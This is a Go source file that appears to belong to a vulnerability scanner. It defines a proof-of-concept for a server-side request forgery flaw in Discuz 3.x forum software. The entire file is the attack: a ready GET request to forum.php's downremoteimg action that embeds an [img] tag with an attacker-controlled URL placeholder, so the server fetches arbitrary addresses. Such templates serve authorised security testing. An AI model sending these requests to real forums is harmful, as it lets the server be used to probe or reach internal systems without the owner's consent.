package poc

func (Info *PocInfo) Discuz_v3x_Downremoteimg_SSRF_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = ""
	poc.Info.Target = "discuz"
	poc.Info.Type = "SSRF"
	poc.Info.Name = "Disucz 3.x downremoteimg SSRF"
	poc.Info.Level = 1
	poc.Info.Author = "youzai"

	// 设置poc-Poc信息
	poc.Poc.Proto = "http"
	poc.Poc.Method = "GET"
	poc.Poc.Path = []string{"/forum.php?mod=ajax&action=downremoteimg&message=forum.php?mod=ajax&action=downremoteimg&message=[img]{{SSRF_URL}}/add/{{SSRF_URL}}[/img]"}
	poc.Poc.Param = []string{"message"}
	poc.Poc.Header = nil
	poc.Poc.Data = nil
	poc.Poc.Word = nil

	// 设置poc-Config信息
	poc.Config.Customize = false

	PocStruct = append(PocStruct, poc)
}
